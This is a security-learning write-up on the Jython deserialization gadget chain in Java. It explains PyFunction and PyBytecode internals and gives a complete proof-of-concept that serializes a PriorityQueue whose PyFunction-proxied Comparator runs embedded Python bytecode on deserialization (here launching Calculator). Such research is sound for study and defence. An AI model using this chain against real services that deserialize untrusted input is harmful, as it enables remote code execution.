#Java Security Learning—Jython Chain

Author: H3rmesk1t

Data: 2022.03.16

# Jython Introduction
[Jython](https://www.jython.org/#:~:text=Links-,What%20is%20Jython%3F,-Jython%20is%20a) is a Java implementation of Python that combines expressive power with clarity. Jython is freely available for both commercial and non-commercial use and is distributed with source code under the PSF License v2. Jython is comprehensively to Java and is especially suited for the following tasks:
 - Embedded scripting - Java programs can add the Jython libraries to their system to allow end users to write simple or complicated scripts that add functionality to the application.
 - Interactive experimentation - Jython provides an interactive interpreter that can be used to interact with Java packages or with running Java applications. This allows programmers to experiment and debug any Java system using Jython.
 - Rapid application development - Python programs are typically 2-10x shorter than the equivalent Java program. This translates directly to increased programmer productivity. The seamless interaction between Python and Java allows developers to freely mix the two languages ​​both during development and in shipping products.

# Pre-knowledge
## Basic use
 - Execute any python file using `execfile`.
 - Execute python source string using `exec`.
 - Use `eval` to calculate and return the result.
 - Use functions defined in the command space to make calls.

```java
package org.h3rmesk1t.Jython;

import org.python.core.PyFunction;
import org.python.core.PyObject;
import org.python.core.PyString;
import org.python.util.PythonInterpreter;
import org.python.util.jythonTest;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/16 10:37 am
 */
public class Demo {

    public static void execfileFunc() throws Exception {

        String filePath = jythonTest.class.getClassLoader().getResource("test.py").getPath();
        System.out.println(filePath);
        PythonInterpreter interpreter = new PythonInterpreter();
        interpreter.execfile(filePath);
    }

    public static void execFunc() throws Exception {

        PythonInterpreter interpreter = new PythonInterpreter();
        interpreter.exec("import os\nos.system(\"open -a Calculator\")\n");
    }

    public static void evalFunc() throws Exception {

        PythonInterpreter interpreter = new PythonInterpreter();
        PyObject pyObject= interpreter.eval("1+1");
        System.out.println(pyObject);
    }

    public static void selfFunc() throws Exception {

        PythonInterpreter interpreter = new PythonInterpreter();
        interpreter.exec("import os\ndef add(m, n):\n return m+n\n");
        PyFunction function = (PyFunction) interpreter.get("add");
        PyObject object = function.__call__(new PyObject[]{new PyString("Hello, "), new PyString("h3rmesk1t!")});
        System.out.println(object);
    }

    public static void main(String[] args) throws Exception {

        execfileFunc();
        execFunc();
        evalFunc();
        selfFunc();
    }
}
```

<div align=center><img src="./images/1.png"></div>

## PyFunction
In Jython, all `Python` objects are `PyObject`, such as string type `PyString`, numeric type `PyInteger`, function type `PyFunction`, file type `PyFile`, etc., and `PyObject` implements the `Serializable` interface.

`org.python.core.PyFunction` is an implementation of `python` in Jython`, integrating `PyObject`, and implementing the `InvocationHandler` interface. Several important member variables in `PyFunction`:
 - `__name__`: The name of the `python` function, such as `demo` in `def demo()`.
 - `func_code`: `PyCode` object, the specific code object in the function, the class that actually executes the function.
 - `func_globals`: `PyStringMap` object, used to save the context of the current function space, and to call the function.
 - `objtype`: An object of type `PyType`, used to represent the type of the object.

In Jython, all python functions exist in the state of a `PyFunction` instance. If you want to call this function, you need to call the `__call__` method of `PyFunction`. This method has several overloaded methods to receive various parameters to deal with various situations. Follow up on the `__call__` method, you can see that the `this.func_code.call` method will actually be called.

<div align=center><img src="./images/2.png"></div>

At the same time, `PyFunction` implements the InvocationHandler interface, which will call the `this.__call__` method and convert the passed `Java` class to `PyObject` to pass it to the execution method. When `PyFunction` is used as `InvocationHandler` to dynamically proxy an interface, it will actually return the execution result of the `python` function represented by this `PyFunction`.

```java
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
    if (method.getDeclaringClass() == Object.cl
ass) {
        return method.invoke(this, args);
    } else {
        return args != null && args.length != 0 ? this.__call__(Py.javas2pys(args)).__tojava__(method.getReturnType()) : this.__call__().__tojava__(method.getReturnType());
    }
}
```
 
## PyBytecode
In PyFunction, the class that represents the real python code block and can be called is `org.python.core.PyCode`, which is an abstract class that defines a member variable `co_name` and some overloaded `call` call methods.

```java
public abstract class PyCode extends PyObject {
    public String co_name;

    public PyCode() {
    }

    public abstract PyObject call(ThreadState var1, PyFrame var2, PyObject var3);

    public PyObject call(PyFrame frame) {
        return this.call(Py.getThreadState(), frame);
    }

    public PyObject call(ThreadState state, PyFrame frame) {
        return this.call(state, frame, (PyObject)null);
    }

    public abstract PyObject call(ThreadState var1, PyObject[] var2, String[] var3, PyObject var4, PyObject[] var5, PyObject var6);

    public abstract PyObject call(ThreadState var1, PyObject var2, PyObject[] var3, String[] var4, PyObject var5, PyObject[] var6, PyObject var7);

    public abstract PyObject call(ThreadState var1, PyObject var2, PyObject[] var3, PyObject var4);

    public abstract PyObject call(ThreadState var1, PyObject var2, PyObject var3, PyObject[] var4, PyObject var5);

    public abstract PyObject call(ThreadState var1, PyObject var2, PyObject var3, PyObject var4, PyObject[] var5, PyObject var6);

    public abstract PyObject call(ThreadState var1, PyObject var2, PyObject var3, PyObject var4, PyObject var5, PyObject[] var6, PyObject var7);

    public abstract PyObject call(ThreadState var1, PyObject var2, PyObject var3, PyObject var4, PyObject var5, PyObject var6, PyObject[] var7, PyObject var8);
}
```

`PyBaseCode` is a standard implementation of `PyCode` and is also an abstract class. It has two commonly used subclasses: `PyBytecode` and `PyTableCode`.

<div align=center><img src="./images/3.png"></div>

Both subclasses contain executable python code, but the difference is:
 - The actual executable content in `PyTableCode` is stored as a `PyFunctionTable` instance and its index. When calling `PyTableCode`, the `Call_function` method of the `PyFunctionTable` instance is called, which is actually a referenced reflective call.

<div align=center><img src="./images/4.png"></div>

<div align=center><img src="./images/5.png"></div>

 - The actual executable content in `PyBytecode` is stored as `co_code`, which is a `byte` array type data. When calling `PyBytecode`, the `call`->`interpret`->`call_function` method is called to complete the call of the function, which is called directly through the `python` bytecode.

In combination with the previous analysis of the `BeanShell` deserialization vulnerability, you can use `PythonInterpreter` to parse the `PyFunction` dynamic proxy`Comparator` method generated by `python` code, and use `PriorityQueue` to trigger deserialization. However, this approach needs to solve two problems:
 - Dynamically generated `PyFunctionTable` class cannot be found.
 - Deserialization is not supported for some execution classes corresponding to `python` code.

Going back to the previous `PyTableCode` instance, the executable content instance `PyFunctionTable` class is an abstract class without any subclasses. It is exploited by the `makeCode` method of the `org.python.core.BytecodeLoader` class.

<div align=center><img src="./images/6.png"></div>

The loadClassFromBytes method of `BytecodeLoader.Loader` is called in `makeClass`, and the class is generated dynamically from the bytecode using `ASM` or the class is defined using `defineClass`.

```java
public static Class<?> makeClass(String name, byte[] data, Class<?>... references) {
    BytecodeLoader.Loader loader = new BytecodeLoader.Loader();
    Class[] arr$ = references;
    int len$ = references.length;

    for(int i$ = 0; i$ < len$; ++i$) {
        Class reference = arr$[i$];

        try {
            ClassLoader cur = referent.getClassLoader();
            if (cur != null) {
                loader.addParent(cur);
            }
        } catch (SecurityException var9) {
        }
    }

    return loader.loadClassFromBytes(name, data);
}
```

```java
public Class<?> loadClassFromBytes(String name, byte[] data) {
    if (name.endsWith("$py")) {
        try {
            ClassReader cr = new ClassReader(data);
            name = cr.getClassName().replace('/', '.');
        } catch (RuntimeException var4) {
        }
    }

    Class<?> c = this.defineClass(name, data, 0, data.length, this.getClass().getProtectionDomain());
    this.resolveClass(c);
    return c;
}
```

Although `PyFunctionTable` implements the `Serializable` interface, the dynamically loaded classes cannot go through the serialization and deserialization process. For dynamically generated classes, the `ClassLoader` used in the deserialization process cannot find this class object. Therefore, you can use `PyBytecode` to replace `PyTableCode` as `PyCode` of `PyFunction`. You only need to initialize the bytecode of malicious `python` code into `PyBytecode`, and then use `PyBy
tecode` to create `PyFunction`.

# POC

```java
package org.h3rmesk1t.Jython;

import org.python.core.*;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/16 10:36 am
 */
public class JythonExploit {

    public static void main(String[] args) throws Exception {

        String path = "/Users/h3rmesk1t/Downloads/123.py";
        String code = "import os\nos.system('open -a Calculator.app')";

        String pythonByteCode = "7400006401006402008302007D00007C0000690100640300830100017C0000690200830000017403006401008301000164000053";

        // Initialize parameters
        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(path), new PyString("w+"), new PyString(code)};
        String[] names = new String[]{"open", "write", "close", "execfile"};

        // Initialize PyBytecode
        PyBytecode bytecode = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{"", ""}, "noname", "<module>", 0, "");
        Field field = PyBytecode.class.getDeclaredField("co_code");
        field.setAccessible(true);
        field.set(bytecode, new BigInteger(pythonByteCode, 16).toByteArray());

        // Initialize PyFunction with PyBytecode
        PyFunction handler = new PyFunction(new PyStringMap(), null, bytecode);

        // Use PyFunction proxy Comparator
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[]{path, code};

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(priorityQueue, queue);

        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(priorityQueue, 2);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(priorityQueue);
            objectOutputStream.close();

            // Deserialization
            ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
```

<div align=center><img src="./images/7.png"></div>

# Call chain

```java
PriorityQueue.readObject()
    Comparator.compare()
            XThis$Handler.invoke()
                PyFunction.invokeImpl()
                    PyBytecode.call()
```

# Summarize
## Usage Instructions
Use the `PriorityQueue` deserialization to trigger the `compare` method of `Comparator` dynamic proxy using `PyFunction`, and call the `PyBytecode` method to trigger the execution of malicious `python` code.

## Gadget
 - kick-off gadget: java.util.PriorityQueue#readObject
 - sink gadget: org.python.core.PyBytecode#call
 - chain gadget: org.python.core.PyFunction#invokes

# refer to
 - [Jython](https://su18.org/post/ysoserial-su18-6/#:~:text=commons%2Dcollections%20%3A%203.2.2-,Jython,-Jython%20%E6%98%AF%20Python)